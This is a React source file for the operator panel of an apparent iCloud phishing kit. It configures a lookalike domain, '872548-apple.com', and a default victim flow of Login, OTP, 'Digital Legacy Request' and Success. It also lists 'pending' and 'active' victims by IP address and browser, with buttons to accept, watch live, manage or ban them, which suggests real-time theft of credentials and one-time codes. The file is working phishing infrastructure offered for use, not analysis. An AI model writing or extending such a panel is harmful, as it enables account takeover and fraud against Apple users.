'use client';

import { useEffect, useMemo, useState } from "react";
import { trpc } from "@/lib/trpc-react";
import DefaultFlowModal from "../components/DefaultFlowModal";
import Button from "../components/ui/Button";
import Card from "../components/ui/Card";
import { getPanelMainSiteUrl, setPanelMainSiteUrl } from "@/lib/main-site-url";

function VisitorNickname(target) {
  const id = target.id || "";
  const short = id.slice(-6);
  return `Visitor ${short}`;
}

export default function HomePage() {
  const [showDefaultFlowModal, setShowDefaultFlowModal] = useState(false);
  const [mainSiteUrlInput, setMainSiteUrlInput] = useState("");
  const [urlFeedback, setUrlFeedback] = useState("");
  const { data: domainConfig, refetch: refetchDomain } = trpc.domains.getConfig.useQuery({});
  const updateConfigMutation = trpc.domains.updateConfig.useMutation({
    onSuccess: () => refetchDomain(),
  });

  const { data: pending = [], refetch: refetchPending } = trpc.targets.listPending.useQuery(undefined, {
    refetchInterval: 3000,
  });
  const { data: active = [], refetch: refetchActive } = trpc.targets.listActive.useQuery(undefined, {
    refetchInterval: 3000,
  });

  useEffect(() => {
    const panelUrl = getPanelMainSiteUrl();
    const envUrl = process.env.NEXT_PUBLIC_MAIN_SITE_URL || "";
    setMainSiteUrlInput(panelUrl || envUrl);
  }, []);

  async function toggleAllowNewVisitors() {
    const next = !(domainConfig?.allow_new_visitors ?? true);
    await updateConfigMutation.mutateAsync({ allowNewVisitors: next });
  }

  const acceptMutation = trpc.targets.accept.useMutation({
    onSuccess: () => {
      refetchPending();
      refetchActive();
    },
  });
  const denyMutation = trpc.targets.deny.useMutation({
    onSuccess: () => refetchPending(),
  });
  const endAndBanMutation = trpc.targets.endAndBan.useMutation({
    onSuccess: () => refetchActive(),
  });

  async function acceptTarget(targetId, andWatch = false) {
    await acceptMutation.mutateAsync({ targetId });
    if (andWatch) {
      window.location.href = `/${targetId}`;
    }
  }

  async function denyTarget(targetId) {
    await denyMutation.mutateAsync({ targetId });
  }

  async function endAndBan(targetId) {
    await endAndBanMutation.mutateAsync({ targetId });
  }

  const defaultFlow = useMemo(() => {
    if (Array.isArray(domainConfig?.default_pages) && domainConfig.default_pages.length > 0) {
      return domainConfig.default_pages;
    }
    return [{ name: "Login" }, { name: "OTP" }, { name: "Digital Legacy Request" }, { name: "Success" }];
  }, [domainConfig?.default_pages]);

  async function handleSaveDefaultFlow(pages) {
    await updateConfigMutation.mutateAsync({ defaultPages: pages });
    setShowDefaultFlowModal(false);
  }

  function normalizeBaseUrl(input) {
    const raw = String(input || "").trim();
    if (!raw) return "";
    const withProtocol = /^https?:\/\//i.test(raw) ? raw : `https://${raw}`;
    const parsed = new URL(withProtocol);
    return `${parsed.protocol}//${parsed.host}`;
  }

  function handleApplyMainSiteUrl() {
    try {
      const normalized = normalizeBaseUrl(mainSiteUrlInput);
      if (!normalized) {
        setPanelMainSiteUrl("");
        setUrlFeedback("Panel override removed. Using environment/default URL.");
        return;
      }
      setPanelMainSiteUrl(normalized);
      setMainSiteUrlInput(normalized);
      setUrlFeedback(`Main site URL set to ${normalized}`);
    } catch {
      setUrlFeedback("Enter a valid URL or hostname (example.com or https://example.com).");
    }
  }

  return (
    <div className="home-page" style={{ display: "flex", flexDirection: "column", gap: "1.3rem" }}>
      <a href="/home" className="panel-muted" style={{ textDecoration: "none", fontSize: "0.9rem" }}>
        ← Back to Panel Home
      </a>
      <div>
        <h2 style={{ margin: 0, fontSize: "1.7rem" }}>iCloud</h2>
        <p className="panel-card-subtitle">Domains</p>
      </div>

      <Card strong style={{ padding: "1.1rem" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: "1rem", flexWrap: "wrap" }}>
          <div>
            <h3 className="panel-card-title">872548-apple.com</h3>
            <p className="panel-card-subtitle">Domain routing and intake defaults</p>
            <div className={`panel-chip ${(domainConfig?.allow_new_visitors ?? true) ? "panel-chip--success" : "panel-chip--muted"}`}>
              <span style={{ width: 7, height: 7, borderRadius: "50%", background: "currentColor", display: "inline-block" }} />
              {(domainConfig?.allow_new_visitors ?? true) ? "Accepting new visitors" : "Closed to new visitors"}
            </div>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: "0.6rem", flexWrap: "wrap" }}>
            <Button
              variant={(domainConfig?.allow_new_visitors ?? true) ? "success" : "ghost"}
              onClick={toggleAllowNewVisitors}
              disabled={updateConfigMutation.isPending}
            >
              {(domainConfig?.allow_new_visitors ?? true) ? "Allowing" : "Closed"}
            </Button>
            <Button variant="secondary" onClick={() => setShowDefaultFlowModal(true)}>
              Edit Default Flow
            </Button>
          </div>
        </div>
        <div
          className="panel-card"
          style={{ padding: "0.8rem", marginTop: "0.9rem", display: "flex", flexWrap: "wrap", gap: "0.45rem" }}
        >
          <span className="panel-soft" style={{ width: "100%", fontSize: "0.77rem" }}>
            Current default sequence
          </span>
          {defaultFlow.map((page, index) => (
            <span key={`${page.name}-${index}`} className="panel-chip panel-chip--muted">
              {index + 1}. {page.name}
            </span>
          ))}
        </div>
        <div className="panel-card" style={{ padding: "0.85rem", marginTop: "0.9rem" }}>
          <label className="panel-field-label" htmlFor="main-site-url">
            Main site URL used by panel
          </label>
          <div style={{ display: "flex", gap: "0.55rem", flexWrap: "wrap" }}>
            <input
              id="main-site-url"
              className="panel-input"
              value={mainSiteUrlInput}
              onChange={(event) => setMainSiteUrlInput(event.target.value)}
              placeholder="https://example.com"
              style={{ flex: 1, minWidth: 220 }}
            />
            <Button variant="secondary" onClick={handleApplyMainSiteUrl}>
              Apply URL
            </Button>
          </div>
          <p className="panel-soft" style={{ margin: "0.45rem 0 0", fontSize: "0.77rem" }}>
            If empty, panel falls back to `NEXT_PUBLIC_MAIN_SITE_URL`.
          </p>
          {urlFeedback ? (
            <p className="panel-soft" style={{ margin: "0.35rem 0 0", fontSize: "0.77rem" }}>
              {urlFeedback}
            </p>
          ) : null}
        </div>
      </Card>

      <section>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: "1rem", flexWrap: "wrap" }}>
          <h3 style={{ margin: 0 }}>Pending Visitors ({pending.length})</h3>
          {pending.length > 0 && (
            <span className="panel-soft" style={{ fontSize: "0.8rem" }}>
              Bulk clear not available
            </span>
          )}
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: "0.75rem", marginTop: "0.55rem" }}>
          {pending.map((t) => (
            <Card
              key={t.id}
              strong
              style={{
                padding: "0.9rem",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                flexWrap: "wrap",
                gap: "1rem",
              }}
            >
              <div>
                <strong>{VisitorNickname(t)}</strong>
                <p className="panel-card-subtitle" style={{ marginTop: "0.2rem" }}>
                  {t.ip || "—"} • {t.useragent?.slice(0, 44) || "—"}
                </p>
              </div>
              <div style={{ display: "flex", gap: "0.45rem", flexWrap: "wrap" }}>
                <Button
                  onClick={() => acceptTarget(t.id, true)}
                  variant="success"
                >
                  Accept & Watch
                </Button>
                <Button
                  onClick={() => acceptTarget(t.id)}
                  variant="ghost"
                >
                  Accept
                </Button>
                <Button
                  onClick={() => denyTarget(t.id)}
                  variant="danger"
                >
                  Deny
                </Button>
              </div>
            </Card>
          ))}
          {pending.length === 0 && (
            <Card style={{ padding: "0.9rem" }}>
              <p className="panel-soft" style={{ margin: 0 }}>No pending visitors</p>
            </Card>
          )}
        </div>
      </section>

      <section>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: "1rem", flexWrap: "wrap" }}>
          <h3 style={{ margin: 0 }}>Active Visitors ({active.length})</h3>
          {active.length > 0 && (
            <span className="panel-soft" style={{ fontSize: "0.8rem" }}>
              Bulk clear not available
            </span>
          )}
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: "0.75rem", marginTop: "0.55rem" }}>
          {active.map((t) => (
            <Card
              key={t.id}
              strong
              style={{
                padding: "0.9rem",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                flexWrap: "wrap",
                gap: "1rem",
              }}
            >
              <div>
                <strong>{VisitorNickname(t)}</strong>
                <p className="panel-card-subtitle" style={{ marginTop: "0.2rem" }}>
                  {t.ip || "—"} • {t.useragent?.slice(0, 44) || "—"}
                </p>
              </div>
              <div style={{ display: "flex", gap: "0.45rem", flexWrap: "wrap" }}>
                <Button as="a" href={`/${t.id}`} variant="primary" style={{ textDecoration: "none" }}>
                  Manage →
                </Button>
                <Button
                  onClick={() => endAndBan(t.id)}
                  variant="danger"
                >
                  End & Ban
                </Button>
              </div>
            </Card>
          ))}
          {active.length === 0 && (
            <Card style={{ padding: "0.9rem" }}>
              <p className="panel-soft" style={{ margin: 0 }}>No active visitors</p>
            </Card>
          )}
        </div>
      </section>

      {showDefaultFlowModal ? (
        <DefaultFlowModal
          initialPages={defaultFlow}
          onClose={() => setShowDefaultFlowModal(false)}
          onSave={handleSaveDefaultFlow}
          isSaving={updateConfigMutation.isPending}
        />
      ) : null}
    </div>
  );
}
